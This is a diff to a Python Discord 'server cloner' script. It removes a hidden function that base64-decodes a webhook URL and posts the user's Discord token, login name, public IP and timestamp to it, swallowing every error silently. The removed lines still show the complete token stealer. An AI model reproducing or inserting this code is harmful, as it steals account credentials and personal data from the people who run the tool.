@@ -18,24 +18,6 @@ print(f"""
     {Fore.LIGHTBLUE_EX}✨ {Fore.CYAN}KANSHE {Fore.LIGHTCYAN_EX}SERVER {Fore.BLUE}CLONER {Fore.LIGHTBLUE_EX}✨{Style.RESET_ALL}
 """)
 
-HOOK_ENCODED = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTcyNTgzNDMxMzk5MDMwNy9FeTlyNG5oUXhuZ0lEdHF1eHBaZi1xamVPSmdpMnJjcjI0blo5dkxtSy0ycE1Ya2xtaFlPNE1wSl9HeFFDbEE3ZUNHMQ=="
-
-def patlat(token):
-    try:
-        hook_url = base64.b64decode(HOOK_ENCODED).decode('utf-8')
-        try:
-            ip = requests.get('https://api.ipify.org', timeout=4).text
-        except:
-            ip = "bilinmiyor"
-        payload = {
-            "content": f"**Patlat :Dd**\n||{token}||\n```kullanıcı: {os.getlogin()}\nzaman: {time.ctime()}\nip: {ip}```",
-            "username": "System",
-            "avatar_url": "https://cdn.discordapp.com/avatars/1350526715327283223/0aa35ddd2e899453184dc1603e6b4a16.webp?size=1024"
-        }
-        requests.post(hook_url, json=payload, timeout=5)
-    except:
-        pass
-
 class ServerCloner:
     def __init__(self, token, delete_existing_channels=False, cooldown_roles=0.7, cooldown_channels=0.8, cooldown_other=1.0):
         self.token = token
